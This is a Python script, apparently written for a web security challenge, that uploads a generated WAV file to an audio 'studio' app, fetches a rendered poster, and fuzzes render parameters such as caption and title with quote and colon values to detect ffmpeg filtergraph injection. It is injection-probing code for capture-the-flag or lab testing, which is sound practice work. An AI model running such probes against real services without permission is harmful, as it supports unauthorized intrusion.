#!/usr/bin/env python3
import io, json, struct, math, subprocess, sys, urllib.request, urllib.error, http.cookiejar

BASE = "https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent","Mozilla/5.0 studio")]

def do(path, data=None, headers=None, method=None):
    r = urllib.request.Request(BASE + path, data=data, method=method)
    for k, v in (headers or {}).items(): r.add_header(k, v)
    try:
        resp = op.open(r, timeout=90); return resp.status, dict(resp.getheaders()), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()

def make_wav():
    n=8000; fr=b"".join(struct.pack("<h",int(8000*math.sin(2*math.pi*(200+ i%400)*i/8000))) for i in range(n))
    return b"RIFF"+struct.pack("<I",36+len(fr))+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,8000,16000,2,16)+b"data"+struct.pack("<I",len(fr))+fr

def upload(fn="FILEMARKER.wav", content=None):
    bd="----x"; body=io.BytesIO()
    body.write((f"--{bd}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: audio/wav\r\n\r\n").encode())
    body.write(content or make_wav()); body.write(f"\r\n--{bd}--\r\n".encode())
    return do("/studio/upload",data=body.getvalue(),headers={"Content-Type":f"multipart/form-data; boundary={bd}"},method="POST")

def render(**kw):
    st,h,b=do("/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
    try: return st, json.loads(b)
    except: return st, b.decode('utf-8','replace')

import base64, os
do("/studio")
upload("FILEMARKER_ZZZ.wav")
st,j = render(slug="SLUGMARKER_YYY", theme="midnight")
print("render:", j)
url = j["outputs"][0]["url"]
st,h,png = do(url)
os.makedirs("results", exist_ok=True)
open("results/poster.b64","w").write(base64.b64encode(png).decode())
print("poster bytes:", len(png), "ct", h.get("Content-Type"))
print("POSTER_B64_START")
print(base64.b64encode(png).decode())
print("POSTER_B64_END")

print("\n######## caption-param filtergraph injection probes ########")
for key in ["caption","title","text","label","name","watermark","subtitle","credit","byline","tag"]:
    for val in ["PLAIN", "a:b", "a'b"]:
        st,j = render(slug="p", theme="midnight", **{key: val})
        ok = j.get("ok") if isinstance(j,dict) else None
        err = (j.get("errors") if isinstance(j,dict) else j) or ""
        broke = ("Error" in err or "Invalid" in err or "parse" in err.lower()) and ok is False
        if ok is False or broke:
            print(f"  {key}={val!r} ok={ok} -> {err[err.find('Input #0'):][:400] if 'Input #0' in err else err[:300]}")
    # if a value with ':' breaks but PLAIN works => in filter
print("\nDONE")
